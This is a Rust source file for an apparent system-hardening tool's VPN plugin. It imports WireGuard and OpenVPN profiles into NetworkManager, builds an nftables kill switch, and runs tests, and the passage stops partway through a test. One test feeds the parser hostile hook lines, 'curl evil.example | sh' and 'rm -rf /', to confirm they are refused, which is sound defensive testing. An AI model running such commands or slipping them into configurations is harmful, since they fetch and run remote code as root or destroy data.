// SPDX-FileCopyrightText: 2026 Nubian Ibex and IbexWall contributors
// SPDX-License-Identifier: GPL-3.0-or-later

//! `net.vpn`: WireGuard through NetworkManager, and a kill switch.
//!
//! Import turns a `wg-quick` profile into an owned NetworkManager keyfile
//! (root, 0600: the private key lives only there and is never printed in a
//! preview) plus a world-readable record without secrets (interface, the
//! server addresses, whether it sets DNS) that the check and the kill switch
//! read, since a plugin cannot read the 0600 file. Nothing is restarted:
//! NetworkManager watches its connections directory and takes the profile in,
//! and drops it when the rollback removes the file. Restarting it instead
//! would leave a live tunnel behind: a starting NetworkManager adopts an
//! orphan WireGuard device and invents an external profile for it.
//! `PostUp`-style hooks are refused: they run shell commands as root and
//! NetworkManager does not run them anyway.
//!
//! The kill switch is one output chain, ahead of other tables, that accepts
//! loopback, the tunnel's interfaces, the VPN servers (so the tunnel can come
//! back), DHCP, link-local traffic (neighbour discovery and addresses that
//! never leave the link) and an allow list, and drops the rest. Servers must
//! be addresses: resolving a name would itself be a leak. OpenVPN profiles
//! are not imported yet (ADR-0040); the kill switch works for any tunnel
//! interface and server the person names.

mod openvpn;

use std::collections::BTreeMap;

use ibexwall_proto::{
    CheckOutcome, CheckReport, CheckResult, Finding, FindingStatus, Op, Remediation, Severity,
};
use ibexwall_sdk::{Plugin, PluginError, Sandbox};
use ibexwall_sys::nft::{Chain, Fragment, Hook, Proto, Rule, Verdict};
use serde::{Deserialize, Deserializer};
use serde_json::{Value, json};
use sha2::{Digest, Sha256};

const PROFILE_DIR: &str = "/etc/ibexwall/vpn/profiles";
const KILLSWITCH: &str = "/etc/ibexwall/vpn/killswitch.json";
const NM_DIR: &str = "/etc/NetworkManager/system-connections";
const DNS_DIR: &str = "/etc/ibexwall/dns";
/// Ahead of the other IbexWall chains and the distro's firewall.
const PRIORITY: i32 = -250;
const MAX_PROFILE: usize = 16 * 1024;

fn main() {
    let runtime = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .expect("tokio runtime");
    if let Err(err) = runtime.block_on(ibexwall_sdk::serve(Vpn)) {
        eprintln!("ibexwall-plugin-vpn: {err}");
        std::process::exit(1);
    }
}

struct Vpn;

fn many<'de, D: Deserializer<'de>>(deserializer: D) -> Result<Vec<String>, D::Error> {
    #[derive(Deserialize)]
    #[serde(untagged)]
    enum Item {
        Text(String),
        Number(u64),
    }
    #[derive(Deserialize)]
    #[serde(untagged)]
    enum OneOrMany {
        One(Item),
        Many(Vec<Item>),
    }
    let text = |item: Item| match item {
        Item::Text(t) => t,
        Item::Number(n) => n.to_string(),
    };
    Ok(match OneOrMany::deserialize(deserializer)? {
        OneOrMany::One(item) => vec![text(item)],
        OneOrMany::Many(list) => list.into_iter().map(text).collect(),
    })
}

fn flexible_bool<'de, D: Deserializer<'de>>(deserializer: D) -> Result<bool, D::Error> {
    #[derive(Deserialize)]
    #[serde(untagged)]
    enum Flag {
        Bool(bool),
        Text(String),
    }
    Ok(match Flag::deserialize(deserializer)? {
        Flag::Bool(b) => b,
        Flag::Text(t) => t.eq_ignore_ascii_case("true") || t == "1",
    })
}

fn yes() -> bool {
    true
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields, default)]
struct Config {
    /// `import` or `killswitch`.
    action: String,
    name: String,
    /// The text of a `wg-quick` or `.ovpn` profile.
    profile: String,
    #[serde(deserialize_with = "many")]
    interfaces: Vec<String>,
    /// Extra VPN servers as `IP:PORT` (`[v6]:PORT`).
    #[serde(deserialize_with = "many")]
    endpoints: Vec<String>,
    /// Addresses that stay reachable outside the tunnel (an admin's SSH
    /// peer, a local printer).
    #[serde(deserialize_with = "many")]
    allow: Vec<String>,
    #[serde(deserialize_with = "flexible_bool")]
    dhcp: bool,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            action: String::new(),
            name: String::new(),
            profile: String::new(),
            interfaces: vec![],
            endpoints: vec![],
            allow: vec![],
            dhcp: yes(),
        }
    }
}

impl Plugin for Vpn {
    fn id(&self) -> &'static str {
        "net.vpn"
    }

    async fn check(&self, _config: Value) -> Result<CheckReport, PluginError> {
        let active = ibexwall_sys::nm::active_networks().await;
        let kinds = active.iter().map(|n| n.nm_type.clone()).collect::<Vec<_>>();
        Ok(evaluate(&Sandbox::system(), &kinds, "1970-01-01T00:00:00Z"))
    }

    async fn plan(&self, config: Value) -> Result<Vec<Op>, PluginError> {
        let config: Config = serde_json::from_value(config)
            .map_err(|e| PluginError::invalid("config", e.to_string()))?;
        plan(&Sandbox::system(), &config)
    }
}

// ---- WireGuard profile -------------------------------------------------

#[derive(Debug, Default, PartialEq)]
struct Peer {
    public_key: String,
    preshared_key: Option<String>,
    allowed_ips: Vec<String>,
    endpoint: Option<String>,
    keepalive: Option<u16>,
}

#[derive(Debug, Default, PartialEq)]
struct Profile {
    private_key: String,
    addresses: Vec<String>,
    dns: Vec<String>,
    dns_search: Vec<String>,
    listen_port: Option<u16>,
    mtu: Option<u16>,
    fwmark: Option<String>,
    peers: Vec<Peer>,
}

fn is_key(text: &str) -> bool {
    text.len() == 44
        && text.ends_with('=')
        && text[..43]
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'+' || b == b'/')
}

fn is_network(text: &str) -> bool {
    let (addr, len) = text.split_once('/').unwrap_or((text, ""));
    let Ok(ip) = addr.parse::<std::net::IpAddr>() else {
        return false;
    };
    let max = if ip.is_ipv4() { 32 } else { 128 };
    len.is_empty() || len.parse::<u8>().is_ok_and(|l| l <= max)
}

/// `IP:PORT` or `[IPv6]:PORT`, or `host:port` for a name.
fn split_endpoint(text: &str) -> Option<(String, u16)> {
    let (host, port) = if let Some(rest) = text.strip_prefix('[') {
        let (host, rest) = rest.split_once(']')?;
        (host, rest.strip_prefix(':')?)
    } else {
        text.rsplit_once(':')?
    };
    let port: u16 = port.parse().ok().filter(|p| *p != 0)?;
    let ok = !host.is_empty()
        && host
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b':'));
    ok.then(|| (host.to_string(), port))
}

fn parse_profile(text: &str) -> Result<Profile, String> {
    if text.len() > MAX_PROFILE {
        return Err("the profile is too large".into());
    }
    let mut profile = Profile::default();
    let mut section = String::new();
    for raw in text.lines() {
        let line = raw.split('#').next().unwrap_or("").trim();
        if line.is_empty() {
            continue;
        }
        if let Some(name) = line.strip_prefix('[').and_then(|l| l.strip_suffix(']')) {
            section = name.trim().to_ascii_lowercase();
            if section == "peer" {
                profile.peers.push(Peer::default());
            } else if section != "interface" {
                return Err(format!("unknown section `[{name}]`"));
            }
            continue;
        }
        let (key, value) = line
            .split_once('=')
            .ok_or_else(|| format!("`{line}` is not `Key = Value`"))?;
        let (key, value) = (key.trim().to_ascii_lowercase(), value.trim());
        let items = || value.split(',').map(str::trim).filter(|v| !v.is_empty());
        match (section.as_str(), key.as_str()) {
            ("interface", "privatekey") => {
                if !is_key(value) {
                    return Err("PrivateKey is not a WireGuard key".into());
                }
                profile.private_key = value.into();
            }
            ("interface", "address") => {
                for item in items() {
                    if !is_network(item) {
                        return Err(format!("Address `{item}` is not an address"));
                    }
                    profile.addresses.push(item.into());
                }
            }
            ("interface", "dns") => {
                for item in items() {
                    if item.parse::<std::net::IpAddr>().is_ok() {
                        profile.dns.push(item.into());
                    } else if item
                        .bytes()
                        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-'))
                    {
                        profile.dns_search.push(item.into());
                    } else {
                        return Err(format!("DNS `{item}` is not an address or a domain"));
                    }
                }
            }
            ("interface", "listenport") => {
                profile.listen_port = Some(
                    value
                        .parse()
                        .map_err(|_| "ListenPort is not a port".to_string())?,
                );
            }
            ("interface", "mtu") => {
                profile.mtu = Some(
                    value
                        .parse()
                        .map_err(|_| "MTU is not a number".to_string())?,
                );
            }
            ("interface", "fwmark") => {
                if value != "off" && !value.bytes().all(|b| b.is_ascii_hexdigit() || b == b'x') {
                    return Err("FwMark is not a number".into());
                }
                profile.fwmark = Some(value.into());
            }
            ("interface", "preup" | "postup" | "predown" | "postdown" | "saveconfig" | "table") => {
                return Err(format!(
                    "`{}` is not supported: it runs commands as root, and NetworkManager does not run it",
                    key
                ));
            }
            ("peer", "publickey") => {
                if !is_key(value) {
                    return Err("PublicKey is not a WireGuard key".into());
                }
                profile.peers.last_mut().expect("peer").public_key = value.into();
            }
            ("peer", "presharedkey") => {
                if !is_key(value) {
                    return Err("PresharedKey is not a WireGuard key".into());
                }
                profile.peers.last_mut().expect("peer").preshared_key = Some(value.into());
            }
            ("peer", "allowedips") => {
                for item in items() {
                    if !is_network(item) {
                        return Err(format!("AllowedIPs `{item}` is not a network"));
                    }
                    profile
                        .peers
                        .last_mut()
                        .expect("peer")
                        .allowed_ips
                        .push(item.into());
                }
            }
            ("peer", "endpoint") => {
                split_endpoint(value)
                    .ok_or_else(|| format!("Endpoint `{value}` is not host:port"))?;
                profile.peers.last_mut().expect("peer").endpoint = Some(value.into());
            }
            ("peer", "persistentkeepalive") => {
                profile.peers.last_mut().expect("peer").keepalive = Some(
                    value
                        .parse()
                        .map_err(|_| "PersistentKeepalive is not a number".to_string())?,
                );
            }
            (_, other) => return Err(format!("unknown setting `{other}`")),
        }
    }
    if profile.private_key.is_empty() {
        return Err("the profile has no PrivateKey".into());
    }
    if profile.peers.is_empty() || profile.peers.iter().any(|p| p.public_key.is_empty()) {
        return Err("the profile needs a [Peer] with a PublicKey".into());
    }
    Ok(profile)
}

/// A name that is safe in a file name, an interface name and a keyfile.
fn valid_name(name: &str) -> bool {
    (1..=10).contains(&name.len())
        && name
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
        && !name.starts_with('-')
}

fn uuid_for(name: &str) -> String {
    let digest = Sha256::digest(format!("ibexwall-vpn:{name}"));
    let h: String = digest.iter().take(16).map(|b| format!("{b:02x}")).collect();
    format!(
        "{}-{}-5{}-a{}-{}",
        &h[0..8],
        &h[8..12],
        &h[13..16],
        &h[17..20],
        &h[20..32]
    )
}

fn keyfile(name: &str, interface: &str, profile: &Profile) -> String {
    let mut out = format!(
        "# Managed by IbexWall (net.vpn).\n[connection]\nid=ibexwall-{name}\nuuid={}\ntype=wireguard\ninterface-name={interface}\nautoconnect=true\n\n[wireguard]\nprivate-key={}\n",
        uuid_for(name),
        profile.private_key
    );
    if let Some(port) = profile.listen_port {
        out.push_str(&format!("listen-port={port}\n"));
    }
    if let Some(mark) = &profile.fwmark {
        out.push_str(&format!("fwmark={mark}\n"));
    }
    if let Some(mtu) = profile.mtu {
        out.push_str(&format!("mtu={mtu}\n"));
    }
    for peer in &profile.peers {
        out.push_str(&format!("\n[wireguard-peer.{}]\n", peer.public_key));
        if let Some(endpoint) = &peer.endpoint {
            out.push_str(&format!("endpoint={endpoint}\n"));
        }
        if !peer.allowed_ips.is_empty() {
            out.push_str(&format!("allowed-ips={};\n", peer.allowed_ips.join(";")));
        }
        if let Some(key) = &peer.preshared_key {
            out.push_str(&format!("preshared-key={key}\npreshared-key-flags=0\n"));
        }
        if let Some(keepalive) = peer.keepalive {
            out.push_str(&format!("persistent-keepalive={keepalive}\n"));
        }
    }
    let (v4, v6): (Vec<&String>, Vec<&String>) =
        profile.addresses.iter().partition(|a| !a.contains(':'));
    let dns = |v6: bool| -> String {
        let list: Vec<&String> = profile
            .dns
            .iter()
            .filter(|d| d.contains(':') == v6)
            .collect();
        if list.is_empty() {
            String::new()
        } else {
            format!(
                "dns={};\n",
                list.iter()
                    .map(|d| d.as_str())
                    .collect::<Vec<_>>()
                    .join(";")
            )
        }
    };
    for (section, list, is6) in [("ipv4", v4, false), ("ipv6", v6, true)] {
        out.push_str(&format!("\n[{section}]\n"));
        if list.is_empty() {
            out.push_str(if is6 {
                "method=ignore\n"
            } else {
                "method=disabled\n"
            });
        } else {
            out.push_str("method=manual\n");
            for (i, addr) in list.iter().enumerate() {
                out.push_str(&format!("address{}={addr}\n", i + 1));
            }
            out.push_str(&dns(is6));
            if !profile.dns_search.is_empty() {
                out.push_str(&format!("dns-search={};\n", profile.dns_search.join(";")));
            }
        }
    }
    out
}

// ---- plan ----------------------------------------------------------------

fn plan(sandbox: &Sandbox, config: &Config) -> Result<Vec<Op>, PluginError> {
    match config.action.as_str() {
        "import" => plan_import(sandbox, config),
        "killswitch" => plan_killswitch(sandbox, config),
        _ => Err(PluginError::invalid(
            "action",
            "action is `import` (a WireGuard or OpenVPN profile) or `killswitch`",
        )),
    }
}

fn networkmanager_present(sandbox: &Sandbox) -> bool {
    [
        "/usr/lib/systemd/system/NetworkManager.service",
        "/lib/systemd/system/NetworkManager.service",
        "/etc/systemd/system/NetworkManager.service",
    ]
    .iter()
    .any(|p| sandbox.exists(p))
}

/// NetworkManager's OpenVPN plugin, which a `.ovpn` import needs.
fn openvpn_plugin_present(sandbox: &Sandbox) -> bool {
    [
        "/usr/lib/NetworkManager/VPN/nm-openvpn-service.name",
        "/usr/lib64/NetworkManager/VPN/nm-openvpn-service.name",
        "/etc/NetworkManager/VPN/nm-openvpn-service.name",
    ]
    .iter()
    .any(|p| sandbox.exists(p))
}

fn plan_import(sandbox: &Sandbox, config: &Config) -> Result<Vec<Op>, PluginError> {
    // WireGuard profiles have an [Interface]; anything else is read as OpenVPN.
    if !config.profile.contains("[Interface]") {
        if !config.profile.contains("remote") {
            return Err(PluginError::invalid(
                "profile",
                "neither a WireGuard profile (an [Interface] section) nor an OpenVPN profile (`client`, `remote`)",
            ));
        }
        return plan_import_openvpn(sandbox, config);
    }
    if !valid_name(&config.name) {
        return Err(PluginError::invalid(
            "name",
            "1 to 10 characters: lowercase letters, digits and `-`",
        ));
    }
    if !networkmanager_present(sandbox) || !sandbox.exists("/usr/bin/nmcli") {
        return Err(PluginError::invalid(
            "action",
            "NetworkManager is not installed; IbexWall installs no software",
        ));
    }
    let profile = parse_profile(&config.profile).map_err(|e| PluginError::invalid("profile", e))?;
    let interface = format!("wgib-{}", config.name);
    let full_tunnel = profile.peers.iter().any(|p| {
        p.allowed_ips
            .iter()
            .any(|a| a == "0.0.0.0/0" || a == "::/0")
    });
    let record = json!({
        "name": config.name,
        "kind": "wireguard",
        "interface": interface,
        "endpoints": profile.peers.iter().filter_map(|p| p.endpoint.clone()).collect::<Vec<_>>(),
        "dns": !profile.dns.is_empty(),
        "full_tunnel": full_tunnel,
    });
    Ok(vec![
        Op::FileWrite {
            path: format!("{NM_DIR}/ibexwall-{}.nmconnection", config.name),
            content: keyfile(&config.name, &interface, &profile),
            mode: "0600".into(),
            owner: "root".into(),
            group: "root".into(),
        },
        Op::FileWrite {
            path: format!("{PROFILE_DIR}/{}.json", config.name),
            content: format!("{record}\n"),
            mode: "0644".into(),
            owner: "root".into(),
            group: "root".into(),
        },
        // NetworkManager does not watch its directory: tell it to re-read.
        // Symmetric, so the rollback says it again once the files are gone
        // and NetworkManager lets go of the profile and the device.
        Op::Exec {
            path: "/usr/bin/nmcli".into(),
            args: vec!["connection".into(), "reload".into()],
        },
    ])
}

fn plan_import_openvpn(sandbox: &Sandbox, config: &Config) -> Result<Vec<Op>, PluginError> {
    if !valid_name(&config.name) {
        return Err(PluginError::invalid(
            "name",
            "1 to 10 characters: lowercase letters, digits and `-`",
        ));
    }
    if !networkmanager_present(sandbox) || !sandbox.exists("/usr/bin/nmcli") {
        return Err(PluginError::invalid(
            "action",
            "NetworkManager is not installed; IbexWall installs no software",
        ));
    }
    if !openvpn_plugin_present(sandbox) {
        return Err(PluginError::invalid(
            "action",
            "NetworkManager's OpenVPN plugin is not installed; IbexWall installs no software",
        ));
    }
    let profile =
        openvpn::parse(&config.profile).map_err(|e| PluginError::invalid("profile", e))?;
    let dir = format!("/etc/ibexwall/vpn/openvpn/{}", config.name);
    let file = |name: &str, content: &str, mode: &str| Op::FileWrite {
        path: format!("{dir}/{name}"),
        content: content.to_string(),
        mode: mode.into(),
        owner: "root".into(),
        group: "root".into(),
    };
    let mut ops = vec![file("ca.pem", &profile.ca, "0644")];
    if let (Some(cert), Some(key)) = (&profile.cert, &profile.key) {
        ops.push(file("cert.pem", cert, "0644"));
        ops.push(file("key.pem", key, "0600"));
    }
    if let Some(t) = &profile.tls_crypt {
        ops.push(file("tls-crypt.key", t, "0600"));
    }
    if let Some(t) = &profile.tls_auth {
        ops.push(file("ta.key", t, "0600"));
    }
    let keyfile = format!(
        "# Managed by IbexWall (net.vpn).\n[connection]\nid=ibexwall-{name}\nuuid={}\ntype=vpn\nautoconnect=false\n\n[vpn]\n{}\n[ipv4]\nmethod=auto\n\n[ipv6]\nmethod=auto\n",
        uuid_for(&config.name),
        openvpn::keyfile_data(&profile, &dir),
        name = config.name
    );
    let record = json!({
        "name": config.name,
        "kind": "openvpn",
        "interface": "tun",
        "endpoints": profile.remotes.iter().map(|r| format!("{}:{}", r.host, r.port)).collect::<Vec<_>>(),
        "dns": false,
        "full_tunnel": null,
    });
    ops.push(Op::FileWrite {
        path: format!("{NM_DIR}/ibexwall-{}.nmconnection", config.name),
        content: keyfile,
        mode: "0600".into(),
        owner: "root".into(),
        group: "root".into(),
    });
    ops.push(Op::FileWrite {
        path: format!("{PROFILE_DIR}/{}.json", config.name),
        content: format!("{record}\n"),
        mode: "0644".into(),
        owner: "root".into(),
        group: "root".into(),
    });
    ops.push(Op::Exec {
        path: "/usr/bin/nmcli".into(),
        args: vec!["connection".into(), "reload".into()],
    });
    Ok(ops)
}

/// Server addresses of every imported profile.
fn recorded(sandbox: &Sandbox) -> Vec<Value> {
    sandbox
        .list(PROFILE_DIR)
        .into_iter()
        .filter(|n| n.ends_with(".json"))
        .filter_map(|n| sandbox.read(&format!("{PROFILE_DIR}/{n}")))
        .filter_map(|t| serde_json::from_str(&t).ok())
        .collect()
}

fn rule(configure: impl FnOnce(&mut Rule)) -> Rule {
    let mut rule = Rule {
        oif_loopback: false,
        iif_loopback: false,
        iif_prefix: None,
        oif_prefix: None,
        saddr: vec![],
        daddr: vec![],
        ct_established: false,
        ct_new: false,
        mark: None,
        icmp: false,
        uid_not: None,
        protocols: vec![],
        dports: vec![],
        verdict: Verdict::Accept,
    };
    configure(&mut rule);
    rule
}

fn plan_killswitch(sandbox: &Sandbox, config: &Config) -> Result<Vec<Op>, PluginError> {
    let interfaces = if config.interfaces.is_empty() {
        vec!["wg".to_string(), "tun".to_string()]
    } else {
        config.interfaces.clone()
    };
    let mut endpoints: Vec<String> = config.endpoints.clone();
    for record in recorded(sandbox) {
        for endpoint in record["endpoints"].as_array().into_iter().flatten() {
            if let Some(text) = endpoint.as_str() {
                endpoints.push(text.to_string());
            }
        }
    }
    endpoints.sort();
    endpoints.dedup();
    if endpoints.is_empty() {
        return Err(PluginError::invalid(
            "endpoints",
            "no VPN server is known: import a profile with IbexWall, or name the server as IP:PORT",
        ));
    }
    let mut server_rules = Vec::new();
    for text in &endpoints {
        let (host, port) = split_endpoint(text)
            .ok_or_else(|| PluginError::invalid("endpoints", format!("`{text}` is not IP:PORT")))?;
        if host.parse::<std::net::IpAddr>().is_err() {
            return Err(PluginError::invalid(
                "endpoints",
                format!(
                    "`{host}` is a name; the kill switch needs the server's address (resolving it here would be a leak). Give it as endpoints=IP:{port}"
                ),
            ));
        }
        server_rules.push(rule(|r| {
            r.daddr = vec![host.clone()];
            r.protocols = vec![Proto::Udp, Proto::Tcp];
            r.dports = vec![port];
        }));
    }
    let mut rules = vec![rule(|r| r.oif_loopback = true)];
    for prefix in &interfaces {
        rules.push(rule(|r| r.oif_prefix = Some(prefix.clone())));
    }
    rules.extend(server_rules);
    if config.dhcp {
        rules.push(rule(|r| {
            r.protocols = vec![Proto::Udp];
            r.dports = vec![67, 547];
        }));
    }
    // Link-local addresses never leave the link, and neighbour discovery
    // needs the solicited-node and router multicast groups.
    rules.push(rule(|r| {
        r.daddr = [
            "169.254.0.0/16",
            "fe80::/10",
            "ff02::1:ff00:0/104",
            "ff02::1",
            "ff02::2",
        ]
        .map(String::from)
        .to_vec();
    }));
    if !config.allow.is_empty() {
        rules.push(rule(|r| r.daddr = config.allow.clone()));
    }
    rules.push(rule(|r| r.verdict = Verdict::Drop));
    let fragment = Fragment {
        chains: vec![Chain {
            name: "net_vpn_out".into(),
            priority: PRIORITY,
            hook: Hook::Output,
            rules,
        }],
    };
    fragment
        .validate()
        .map_err(|e| PluginError::invalid("allow", e.to_string()))?;
    let marker = json!({ "interfaces": interfaces, "endpoints": endpoints, "allow": config.allow });
    Ok(vec![
        Op::FileWrite {
            path: KILLSWITCH.into(),
            content: format!("{marker}\n"),
            mode: "0644".into(),
            owner: "root".into(),
            group: "root".into(),
        },
        Op::NftFragment {
            fragment: serde_json::to_value(&fragment)
                .map_err(|e| PluginError::Failed(e.to_string()))?,
        },
    ])
}

// ---- check ---------------------------------------------------------------

/// `active_kinds`: NetworkManager's type of each active connection.
fn evaluate(sandbox: &Sandbox, active_kinds: &[String], detected_at: &str) -> CheckReport {
    let profiles = recorded(sandbox);
    let tunnel_up = active_kinds
        .iter()
        .any(|k| k == "wireguard" || k == "vpn" || k == "tun");
    let has_vpn = !profiles.is_empty() || tunnel_up;
    let killswitch = sandbox.exists(KILLSWITCH);
    let secure_dns = !sandbox.list(DNS_DIR).is_empty();
    let finding =
        |id: &str, severity, title: &str, summary: &str, template: Option<&str>| Finding {
            id: id.into(),
            plugin: "net.vpn".into(),
            severity,
            title_key: title.into(),
            summary_key: summary.into(),
            args: BTreeMap::new(),
            references: vec![],
            remediation: template.map(|t| Remediation {
                plan_template: Some(t.into()),
                may_affect_keys: vec!["vpn-may-affect-network".into(), "vpn-may-affect-lan".into()],
            }),
            status: FindingStatus::Open,
            detected_at: detected_at.into(),
        };
    let mut findings = Vec::new();
    let mut results = Vec::new();

    let ks_outcome = if !has_vpn {
        CheckOutcome::NotApplicable
    } else if killswitch {
        CheckOutcome::Pass
    } else {
        findings.push(finding(
            "vpn.no_killswitch",
            Severity::Medium,
            "vpn-no-killswitch-title",
            "vpn-no-killswitch-summary",
            Some("vpn.killswitch"),
        ));
        CheckOutcome::Fail
    };
    results.push(CheckResult {
        id: "vpn.killswitch".into(),
        severity: Severity::Medium,
        outcome: ks_outcome,
    });

    let sets_dns = profiles.iter().any(|p| p["dns"] == true);
    let dns_outcome = if !has_vpn || !secure_dns {
        CheckOutcome::NotApplicable
    } else if sets_dns {
        findings.push(finding(
            "vpn.dns_conflict",
            Severity::Low,
            "vpn-dns-title",
            "vpn-dns-summary",
            None,
        ));
        CheckOutcome::Fail
    } else {
        CheckOutcome::Pass
    };
    results.push(CheckResult {
        id: "vpn.dns".into(),
        severity: Severity::Low,
        outcome: dns_outcome,
    });

    // Not a weakness: the kill switch doing its job, said plainly so a
    // blocked connection is not a mystery.
    if killswitch && !tunnel_up {
        findings.push(finding(
            "vpn.blocked",
            Severity::Info,
            "vpn-blocked-title",
            "vpn-blocked-summary",
            None,
        ));
    }
    CheckReport { results, findings }
}

#[cfg(test)]
mod tests {
    use super::*;

    const PRIV: &str = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=";
    const PUB: &str = "xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=";

    fn wg(extra_interface: &str) -> String {
        format!(
            "[Interface]\nPrivateKey = {PRIV}\nAddress = 10.100.0.2/24, fd00::2/64\nDNS = 10.100.0.1, lan.example\n{extra_interface}\n[Peer]\nPublicKey = {PUB}\nEndpoint = 10.99.0.2:51820\nAllowedIPs = 0.0.0.0/0, ::/0\nPersistentKeepalive = 25 # keep NAT open\n"
        )
    }

    fn tree(files: &[(&str, &str)]) -> (std::path::PathBuf, Sandbox) {
        static N: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
        let root = std::env::temp_dir().join(format!(
            "ibx-vpn-{}-{}",
            std::process::id(),
            N.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        for (path, content) in files {
            let full = root.join(path.trim_start_matches('/'));
            std::fs::create_dir_all(full.parent().unwrap()).unwrap();
            std::fs::write(full, content).unwrap();
        }
        (root.clone(), Sandbox::at(root))
    }

    const NM: [(&str, &str); 2] = [
        ("/usr/lib/systemd/system/NetworkManager.service", ""),
        ("/usr/bin/nmcli", ""),
    ];

    fn cfg(value: Value) -> Config {
        serde_json::from_value(value).unwrap()
    }

    #[test]
    fn a_wg_quick_profile_becomes_a_private_keyfile_and_a_public_record() {
        let (root, sandbox) = tree(&NM);
        let ops = plan(
            &sandbox,
            &cfg(json!({ "action": "import", "name": "lab", "profile": wg("") })),
        )
        .unwrap();
        let Op::FileWrite {
            path,
            content,
            mode,
            ..
        } = &ops[0]
        else {
            panic!()
        };
        assert_eq!(
            path,
            "/etc/NetworkManager/system-connections/ibexwall-lab.nmconnection"
        );
        assert_eq!(mode, "0600");
        for line in [
            "type=wireguard",
            "interface-name=wgib-lab",
            "private-key=yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=",
            "endpoint=10.99.0.2:51820",
            "allowed-ips=0.0.0.0/0;::/0;",
            "persistent-keepalive=25",
            "address1=10.100.0.2/24",
            "address1=fd00::2/64",
            "dns=10.100.0.1;",
            "dns-search=lan.example;",
        ] {
            assert!(content.contains(line), "{line}\n{content}");
        }
        let Op::FileWrite {
            content: record,
            mode: record_mode,
            ..
        } = &ops[1]
        else {
            panic!()
        };
        assert_eq!(record_mode, "0644");
        assert!(!record.contains(PRIV) && record.contains("10.99.0.2:51820"));
        // Two writes, then the fixed reload; nothing else.
        assert_eq!(ops.len(), 3);
        assert!(
            matches!(&ops[2], Op::Exec { path, args } if path == "/usr/bin/nmcli" && args == &["connection", "reload"])
        );
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn the_uuid_is_stable_and_well_formed() {
        let id = uuid_for("lab");
        assert_eq!(id, uuid_for("lab"));
        assert_ne!(id, uuid_for("work"));
        let parts: Vec<_> = id.split('-').map(str::len).collect();
        assert_eq!(parts, [8, 4, 4, 4, 12]);
    }

    #[test]
    fn hooks_and_malformed_profiles_are_refused() {
        for (extra, why) in [
            ("PostUp = curl evil.example | sh", "PostUp"),
            ("PreDown = rm -rf /", "PreDown"),
            ("SaveConfig = true", "SaveConfig"),
            ("Table = 123", "Table"),
            ("Bogus = 1", "unknown setting"),
        ] {
            let error = parse_profile(&wg(extra)).unwrap_err();
            assert!(
                error.to_lowercase().contains(&why.to_lowercase()),
                "{extra}: {error}"
            );
        }
        for bad in [
            "".to_string(),
            "[Interface]\nPrivateKey = short\n".to_string(),
            wg("").replace("10.99.0.2:51820", "no-port"),
            wg("").replace("0.0.0.0/0", "not-a-network"),
            wg("").replace("Address = 10.100.0.2/24", "Address = 10.100.0.2/99"),
            "[Weird]\nx=1".to_string(),
            format!("[Interface]\nPrivateKey = {PRIV}\n"),
            "a".repeat(MAX_PROFILE + 1),
        ] {
            assert!(parse_profile(&bad).is_err(), "{bad:?}");
        }
    }

    #[test]
    fn names_and_missing_networkmanager_are_refused() {
        let (root, sandbox) = tree(&NM);
        for name in ["", "Lab", "-lab", "a.b", "toolongnamehere", "a b"] {
            assert!(
                plan(
                    &sandbox,
                    &cfg(json!({ "action": "import", "name": name, "profile": wg("") }))
                )
                .is_err(),
                "{name}"
            );
        }
        let (bare, sandbox2) = tree(&[]);
        let error = plan(
            &sandbox2,
            &cfg(json!({ "action": "import", "name": "lab", "profile": wg("") })),
        )
        .unwrap_err();
        assert!(error.to_string().contains("NetworkManager"));
        assert!(plan(&sandbox, &cfg(json!({}))).is_err());
        std::fs::remove_dir_all(root).unwrap();
        std::fs::remove_dir_all(bare).unwrap();
    }

    const OVPN_PLUGIN: (&str, &str) = ("/usr/lib/NetworkManager/VPN/nm-openvpn-service.name", "");

    fn ovpn() -> String {
        let ca =
            "-----BEGIN CERTIFICATE-----\nMIIBszCCAVmgAwIBAgIUQm9ndXM=\n-----END CERTIFICATE-----";
        let key = "-----BEGIN PRIVATE KEY-----\nMIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQg\n-----END PRIVATE KEY-----";
        let crypt = "-----BEGIN OpenVPN Static key V1-----\n0123456789abcdef\n-----END OpenVPN Static key V1-----";
        format!(
            "client\ndev tun\nproto udp\nremote 10.99.0.2 1194\nremote-cert-tls server\ncipher AES-256-GCM\n<ca>\n{ca}\n</ca>\n<cert>\n{ca}\n</cert>\n<key>\n{key}\n</key>\n<tls-crypt>\n{crypt}\n</tls-crypt>\n"
        )
    }

    #[test]
    fn an_openvpn_profile_becomes_owned_files_a_keyfile_and_a_record_with_keys_private() {
        let (root, sandbox) = tree(&[NM[0], NM[1], OVPN_PLUGIN]);
        let ops = plan(
            &sandbox,
            &cfg(json!({ "action": "import", "name": "lab", "profile": ovpn() })),
        )
        .unwrap();
        let written: Vec<(&str, &str)> = ops
            .iter()
            .filter_map(|o| match o {
                Op::FileWrite { path, mode, .. } => Some((path.as_str(), mode.as_str())),
                _ => None,
            })
            .collect();
        for (path, mode) in [
            ("/etc/ibexwall/vpn/openvpn/lab/ca.pem", "0644"),
            ("/etc/ibexwall/vpn/openvpn/lab/cert.pem", "0644"),
            ("/etc/ibexwall/vpn/openvpn/lab/key.pem", "0600"),
            ("/etc/ibexwall/vpn/openvpn/lab/tls-crypt.key", "0600"),
            (
                "/etc/NetworkManager/system-connections/ibexwall-lab.nmconnection",
                "0600",
            ),
            ("/etc/ibexwall/vpn/profiles/lab.json", "0644"),
        ] {
            assert!(
                written.contains(&(path, mode)),
                "{path} {mode}: {written:?}"
            );
        }
        let keyfile = ops
            .iter()
            .find_map(|o| match o {
                Op::FileWrite { path, content, .. } if path.ends_with(".nmconnection") => {
